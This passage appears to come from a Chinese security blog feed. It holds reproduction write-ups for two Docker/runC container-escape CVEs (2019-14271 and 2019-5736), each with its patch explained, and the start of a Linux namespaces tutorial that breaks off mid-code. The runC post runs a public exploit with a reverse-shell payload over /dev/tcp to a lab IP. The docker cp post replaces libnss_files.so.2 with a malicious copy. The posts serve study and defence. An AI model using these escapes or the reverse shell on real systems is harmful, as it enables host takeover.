，报错信息写着加载到了 libnss_files.so.2 文件</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行<code>docker cp</code>后即触发漏洞主要有两种方式</p><ol><li>拉取一个攻击者构造恶意 <code>libnss_*.so</code> 动态链接库的容器</li><li>攻击者获取到容器内一定权限，可以替换 <code>libnss_*.so</code> </li></ol><p>漏洞利用exp下载：<a href="https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271/exp">https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271/exp</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name=14271 ubuntu bash</span><br><span class="line">docker cp exp/ 14271:/</span><br><span class="line">docker <span class="built_in">exec</span> -it 14271 bash</span><br><span class="line">ls /exp</span><br><span class="line">breakout  libnss_files.so.2  original_libnss_files.so.2</span><br><span class="line">cp /exp/* /</span><br><span class="line">chmod 777 /breakout</span><br><span class="line">touch /logs</span><br><span class="line">rm /lib/x86_64-linux-gnu/libnss_files.so.2</span><br><span class="line">mv /libnss_files.so.2 /lib/x86_64-linux-gnu/</span><br></pre></td></tr></table></figure><p><img src="/img/moby-container-escape/image-20220427084651396.png" class="lazyload" data-srcset="/img/moby-container-escape/image-20220427084651396.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220427084651396"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/moby/moby/pull/39612/files">https://github.com/moby/moby/pull/39612/files</a></p><p>在 chrootarchive 包初始化时先加载 <code>libnss</code> 动态链接库，因为 <code>user</code> 和 <code>net</code> 这两个包的方法会加载到，只要调用了， 这时加载是从宿主机加载  <code>libnss</code> 动态链接库，宿主机的库从容器内无法更改，从而避免逃逸问题。</p><p>关于漏洞修复 ssst0n3 师傅分析的更为深入，膜拜 <a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> 容器逃逸 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 容器逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>runC容器逃逸-CVE-2019-5736复现</title>
      <link href="//p/2023/CVE-2019-5736/"/>
      <url>//p/2023/CVE-2019-5736/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>环境部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-5736</span><br></pre></td></tr></table></figure><p>漏洞影响版本</p><ul><li>runC &lt; 1.0-rc6 （docker &lt; 18.09.2）</li></ul><p>利用条件</p><p>需要在容器内具有 root 权限，才能覆盖runC文件</p><p>漏洞描述</p><blockquote><p> runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.</p></blockquote><p>环境版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@cloud_shoot /o/metarget<span class="comment"># docker -v</span></span><br><span class="line">Docker version 18.03.1-ce, build 9ee9f40</span><br><span class="line">root@cloud_shoot /o/metarget<span class="comment"># docker-runc -v</span></span><br><span class="line">runc version 1.0.0-rc5</span><br><span class="line">commit: 4fc53a81fb7c994640722ac585fa9ca548971871</span><br><span class="line">spec: 1.0.0</span><br></pre></td></tr></table></figure><p>拉一下 docker 镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu</span><br><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>漏洞描述中说漏洞主要由runC引起的，那什么是 runC？</p><p><a href="https://os.51cto.com/article/697381.html">https://os.51cto.com/article/697381.html</a></p><p>runC 最初是Docker的一般分核心代码，用于底层容器运行时，被 Docker （”高层次”）调度用来运行容器，后面被单独开源出来了。这里的 “高层次” 是指 容器的镜像创建、管理，创建容器、进入正在运行中的容器 (docker exec) 等功能</p><p>为了防止容器内执行的命令对宿主机造成影响，runC 会创建一个 runC init 的带有命名空间限制的子进程，使得让其可以安全的运行在容器中，然后用户在容器调用命令时，底层<a href="https://github.com/opencontainers/runc/blob/751f18de2af90495e9c5665b95bfc7adf66ddd57/libcontainer/standard_init_linux.go#L206">通过运行execve系统调用</a> 在新的（容器内）命名空间执行。创建新的容器和从宿主机进入到容器内也是这样操作的。</p><p><img src="/img/runc-container-escape/runc_init1.jpeg" class="lazyload" data-srcset="/img/runc-container-escape/runc_init1.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="runc_init1"></p><p>现在问题就是在，runC init 运行时，是直接指向宿主机的 runC 的，也就是说攻击者通过重写 /proc/self/exe 的方式，待用户从宿主机进入容器时，即会篡改宿主机的 runC，最终运行篡改后的 runC 从而造成宿主机命令执行。</p><p><img src="/img/runc-container-escape/runc_init2.jpeg" class="lazyload" data-srcset="/img/runc-container-escape/runc_init2.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="runc_init2"></p><p>那为啥不直接篡改 <code>/proc/[runc-init-pid]/exe</code> ，非得受害者从宿主机进入才能触发漏洞呢？（毕竟篡改了runC，docker在执行很多容器相关操作时都会调用到runC，这样就可以做到被动出发这个漏洞了）</p><p>这都从CVE-2016-9962说起，它是一个能遍历宿主机目录的漏洞。这个漏洞补丁，是在从宿主机进入容器前 runC init 进程不会影响至宿主机的文件，然后进入容器执行<code>execve</code>后会把相关标记位去除，即可影响宿主机上的runC。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>进入拉取的 ubuntu 容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it angry_brahmagupta /bin/bash</span><br></pre></td></tr></table></figure><p>首先，<code>/proc</code> 目录是Linux里记录进程运行信息的虚拟文件系统（运行在内存中，非真正存在于硬盘中），一般都是挂载在 <code>/proc</code>，我们可以认为是内核映射出来的，每个进程都有它自己的目录 <code>/proc/&lt;pid&gt;</code>。然后 <code>/proc/self</code> 表示当前进程所在目录，是 <code>/proc/&lt;pid&gt;</code> 的软链接。对于本漏洞来说，进程目录有1个文件和1个目录需要关注的</p><ul><li><code>/proc/self/exe</code> 当前进程运行着的可执行文件等软链接</li><li><code>/proc/self/fd</code> 包含了当前进程打开的文件描述符</li></ul><p><img src="/img/runc-container-escape/image-20220421092022214.png" class="lazyload" data-srcset="/img/runc-container-escape/image-20220421092022214.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220421092022214"></p><p>运行 <code>/proc/self/exe --help</code>  发现是个 bash 程序，因为我们是运行 <code>/bin/bash</code> 进入的，并以 <code>/bin/bash</code> 执行，而 <code>/proc/self</code> 目录记录的是当前进程的运行信息，<code>/proc/self/exe</code> 是内核为每个进程创建的指向该进程执行二进制文件的软链接。如果在容器内执行 <code>/bin/bash</code> ，最终执行的是 <code>/proc/self/exe </code> ，然后 <code>/proc/self/exe</code> 指向宿主机的 <code>runc</code> 可执行文件。</p><p>如果我们能够改写 <code>/proc/self/exe</code> 那么就可以改写  <code>runc</code> ，又因进入容器时执行的命令会执行 <code>runc</code>, 那么我们就可以在宿主机上执行任意命令了。</p><p>这里存在一个问题，当我们进入容器时，<code>runc</code> 执行，但处理执行中的文件是无法被写入的，但它运行完我们 <code>/proc/[runc-pid]/</code> 目录又会不见了，我们需要记录它。刚刚提及到 <code>/proc/self/fd</code> 的作用，即我们发现 <code>runc</code> 在执行后，通过我们的脚本马上打开它 <code>/proc/[runc-pid]/exe</code>，然后在 <code>/proc/self/fd/xx</code> 就能找到我们打开的 <code>/proc/[runc-pid]/exe</code>，等 <code>runc</code> 执行完后，马上写入它，就可以修改宿主机的 <code>runc</code> 了</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>主要有两种利用方式</p><ol><li>拉取一个攻击者构造的容器，启动后即触发重写 <code>/proc/self/exe</code> 的程序，<a href="https://github.com/twistlock/RunC-CVE-2019-5736/tree/master/malicious_image_POC">可见此</a></li><li>攻击者获取到容器内的 root 权限，运行漏洞EXP，导致受害者在进入容器时宿主机 runc 被执行攻击者构造的命令。下面即演示这种方式</li></ol><p>如果在本机实验，因为漏洞利用会重写 runC，所以请先备份一下 docker-runc 或 runc，或者给虚拟机打个快照（建议快照，本机尝试恢复 docker-runc 无法恢复 docker exec -it 功能）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whereis docker-runc</span><br><span class="line">cp /usr/bin/docker-runc /xxx/docker-runc-bak</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>编译EXP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOOS=linux GOARCH=amd64 go build -o cve-2019-5736 main.go</span><br></pre></td></tr></table></figure><p>生成的EXP放到受害者容器内执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cve-2019-5736 -shell <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.23.204.36/2233 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><p>受害者进入容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it angry_brahmagupta /bin/sh</span><br></pre></td></tr></table></figure><p>注意受害者必须以 <code>/bin/sh</code> 进入容器才能正常执行命令</p><p><img src="/img/runc-container-escape/image-20220418191416980.png" class="lazyload" data-srcset="/img/runc-container-escape/image-20220418191416980.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220418191416980"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p><p><a href="https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d">https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</a></p><p>从宿主机进入容器，即在执行 <code>/proc/self/exe</code> 时，通过 <code>memfd_create</code>  函数先为其在内存中创建一个宿主机 <code>runc</code> 的不可写( <code>O_RDONLY | O_CLOEXEC</code> )临时副本，副本仅可读可执行，且与宿主机 <code>runc</code> 无关，即使能可写也不会影响到宿主机的 <code>runc</code> 从而避免容器逃逸</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> 容器逃逸 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 容器逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命名空间机制及其隔离不当导致的漏洞</title>
      <link href="//p/2022/linux-namespace/"/>
      <url>//p/2022/linux-namespace/</url>
      
        <content type="html"><![CDATA[<p><del>最近</del>（其实年中的时候写好了，一直忘了发出来..）在学习云和容器相关的知识，经过复现几个漏洞和DEBUG Docker 各个部件的源码发现在Linux底层是依靠Linux命名空间和Cgroups对资源进行隔离，这里打算深入学习一下Linux底层知识。</p><h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h2><p>Linux命名空间灵感源自Unix系统命名空间功能，从2002年2.4.19内核版本开始集成至Linux中，Linux内核3.8中引入用户命名空间提供了足够容器支持功能，并逐步发展至今，</p><h2 id="命令空间类型"><a href="#命令空间类型" class="headerlink" title="命令空间类型"></a>命令空间类型</h2><p>Linux 内核经过迭代版本变更共提供 8 种命名空间（表1）</p><table><thead><tr><th align="center">类型</th><th align="center">功能说明</th><th align="center">内核</th></tr></thead><tbody><tr><td align="center">Mount (mnt)</td><td align="center">挂载点和文件系统隔离</td><td align="center">2.4.19<sup>[2]</sup></td></tr><tr><td align="center">UTS</td><td align="center">主机名隔离</td><td align="center">2.6.19<sup>[3]</sup></td></tr><tr><td align="center">Interprocess Communication (ipc)</td><td align="center">进程间通信隔离</td><td align="center">2.6.19<sup>[4]</sup></td></tr><tr><td align="center">Process ID (pid)</td><td align="center">进程隔离</td><td align="center">2.6.24<sup>[5]</sup></td></tr><tr><td align="center">Network (net)</td><td align="center">网络隔离</td><td align="center">2.6.29<sup>[6]</sup></td></tr><tr><td align="center">User ID (user)</td><td align="center">用户隔离</td><td align="center">3.8<sup>[7]</sup></td></tr><tr><td align="center">Control group (cgroup)</td><td align="center">系统资源使用隔离</td><td align="center">4.6<sup>[8]</sup></td></tr><tr><td align="center">Time Namespace</td><td align="center">系统时间隔离</td><td align="center">5.6<sup>[9]</sup></td></tr></tbody></table><ul><li>进程命名空间是嵌套的，即当一个进程被创建时，从其当前命名空间到其初始化命名空间，每个命名空间都有一个pid，而且有个规律：子进程的pid比父进程的小。</li></ul><p><img src="/img/linux-namespace/0cd4986f1afc5990f622fe50c58db42df5b01618.png" class="lazyload" data-srcset="/img/linux-namespace/0cd4986f1afc5990f622fe50c58db42df5b01618.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5579"></p><ul><li>pid 还有一个比较有意思的知识，Linux 系统中 pid 为 1 是系统启动后创建的第1个进程，或者叫 init process，它有一个特征是 <a href="https://en.wikipedia.org/wiki/Orphan_process">orphaned processes</a> 孤立进程附加到这上面，也就是说，如果 pid 1 被 kill 后，他立刻会终结附加到其上的所有子进程，不过默认 pid 1 是被保护起来的，无法正常通过 <code>kill -9 1</code> 等 kill 操作杀死，以保证操作系统的稳定运行，不过可以通过 gdb[10] 来干掉：<code>gdb -p 1</code> 后执行 <code>kill</code></li><li>pid 这里有一个大家可能已用过的案例，即WSL无法使用systemctl的解决方案，因为WSL初始PID不是1，所以用不了，通过把自己隔离让自己看到自己的PID为1</li><li>User ID (user) 提供的用户隔离正是容器化的开始，因为他可以摒弃传统的用户权限分级和控制手段。比如一个命名空间内，可以让其认为自己是 root (uid=0)，但实际上 uid是1400000，用户命名空间也是嵌套的</li><li>Control group (cgroup) 比如限制某个容器能使用几个CPU，多少内存的特性就是因为这个命名空间</li><li>其中 Network 和 User 在Linux 2.6.24 和 2.6.23 已有，到表中记录版本才完善</li></ul><p>确认当前 bash进程的PID 和 各个namespace，中括号内为 namespace 编号</p><p><img src="/img/linux-namespace/b28746495094fca4830b7abc7f745452b49e4e59.png" class="lazyload" data-srcset="/img/linux-namespace/b28746495094fca4830b7abc7f745452b49e4e59.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5554"></p><p>实现命名空间主要是3个系统调用</p><ul><li><a href="https://man7.org/linux/man-pages/man2/clone.2.html">clone()</a> 实现线程的系统调用，用来创建一个新的进程，并可以通过设置命名空间类型参数达到隔离。</li><li><code>unshare()</code> 使某进程脱离某个namespace</li><li><code>setns()</code> 把某进程加入到某个namespace</li></ul><h2 id="mnt隔离-11"><a href="#mnt隔离-11" class="headerlink" title="mnt隔离[11]"></a>mnt隔离<sup>[11]</sup></h2><h3 id="没有隔离的mount"><a href="#没有隔离的mount" class="headerlink" title="没有隔离的mount"></a>没有隔离的mount</h3><blockquote><p>为了简单起见使用tmpfs这种基于内存的文件系统来模拟</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">mkdir /tmp/noisolation</span><br><span class="line">mount -t tmpfs tmpfs /tmp/noisolation/</span><br><span class="line"><span class="built_in">cd</span> /tmp/noisolation/</span><br><span class="line">touch aaa bbb ccc ddd</span><br><span class="line">ll</span><br></pre></td></tr></table></figure><p><img src="/img/linux-namespace/64a869eecfd3f61335a4f4411281d7a7109e8e7e.png" class="lazyload" data-srcset="/img/linux-namespace/64a869eecfd3f61335a4f4411281d7a7109e8e7e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5556"></p><p>新起一个 bash，文件存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@cloud_shoot:~<span class="comment"># echo $$</span></span><br><span class="line">20434</span><br><span class="line">root@cloud_shoot:~<span class="comment"># ll /tmp/noisolation/</span></span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwt  2 root root  120 May 26 09:36 ./</span><br><span class="line">drwxrwxrwt 10 root root 4096 May 26 09:38 ../</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 aaa</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 bbb</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 ccc</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 ddd</span><br></pre></td></tr></table></figure><h3 id="有隔离的-mount"><a href="#有隔离的-mount" class="headerlink" title="有隔离的 mount"></a>有隔离的 mount</h3><p>先创建个测试目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/isolation</span><br></pre></td></tr></table></figure><blockquote><p>Linux内核也提供系统函数实现<sup>[12]</sup>，这里直接使用Linux unshare命令实现隔离</p></blockquote><p>使用 <code>unshare</code> 隔离 mnt namespace</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">unshare --mount /bin/bash</span><br><span class="line"><span class="built_in">echo</span> $$</span><br></pre></td></tr></table></figure><p><img src="/img/linux-namespace/b72763ed1a7ff6795860ea5a280242c781e267b8.png" class="lazyload" data-srcset="/img/linux-namespace/b72763ed1a7ff6795860ea5a280242c781e267b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5558"></p><p>可以清楚看到两个进程为父子进程关系.<code>20516</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep 20516 | grep -v grep</span><br><span class="line">pstree -p | grep 20526</span><br></pre></td></tr></table></figure><p><img src="/img/linux-namespace/3b81b9d4a9bfa4ed4dc2e8f9a31c5a484e3329e4.png" class="lazyload" data-srcset="/img/linux-namespace/3b81b9d4a9bfa4ed4dc2e8f9a31c5a484e3329e4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5560"></p><p>在 <code>20526</code> 即隔离 namespace 中挂载 tmpfs 目录和文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">mount -t tmpfs tmpfs /tmp/isolation</span><br><span class="line"><span class="built_in">cd</span> /tmp/isolation/</span><br><span class="line">touch aaa bbb ccc ddd</span><br><span class="line">ll</span><br></pre></td></tr></table></figure><p><img src="/img/linux-namespace/5646203d43abb13019d43cfea3b9dd0a6513e901.png" class="lazyload" data-srcset="/img/linux-namespace/5646203d43abb13019d43cfea3b9dd0a6513e901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5562"></p><p>查看该 namespace 的编号，发现只有 mnt 改变了</p><p><img src="/img/linux-namespace/be901d3eb62163fbdb0be58072ddb4a924f6dc6d.png" class="lazyload" data-srcset="/img/linux-namespace/be901d3eb62163fbdb0be58072ddb4a924f6dc6d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5564"></p><p>在新起的终端确认 <code>/tmp/isolation</code> 文件内容，文件不存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /tmp/isolation/</span><br></pre></td></tr></table></figure><p><img src="/img/linux-namespace/42ff18b043d103b21d56caaf2fc1ae46b3264d25.png" class="lazyload" data-srcset="/img/linux-namespace/42ff18b043d103b21d56caaf2fc1ae46b3264d25.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5566"></p><p>那其他命名空间呢？</p><h2 id="C实现命名空间隔离实验-13-14"><a href="#C实现命名空间隔离实验-13-14" class="headerlink" title="C实现命名空间隔离实验[13] [14]"></a>C实现命名空间隔离实验<sup>[13] [14]</sup></h2><h3 id="clone-系统调用"><a href="#clone-系统调用" class="headerlink" title="clone()系统调用"></a>clone()系统调用</h3><p>clone.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 